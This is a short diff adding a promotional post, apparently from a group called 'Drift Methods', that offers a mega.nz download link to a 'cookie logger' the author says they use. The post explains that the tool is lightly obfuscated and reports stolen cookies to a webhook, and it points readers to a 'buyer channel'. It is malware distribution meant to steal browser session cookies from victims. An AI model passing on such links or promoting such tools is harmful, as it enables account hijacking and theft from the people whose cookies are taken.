@@ -1,0 +1,9 @@
+Depression Cookie Logger - Drift Methods.
+
+Here is a download link to the personal cookie logger I use to this day. 
+
+Link: https://mega.nz/file/0g8UCLqL#1dHNNOgK5bJO7uPbltcIgcw-l9qRann0NN0um9WgEJM
+
+This is a base level cookie logger, and can be easily deobfuscated. This doens't happen often, but when it does, just know your webhook can get clapped and you may have to make a new one.
+
+Check out the buyer channel in Drfit Methods to get more info. #DriftOnTop
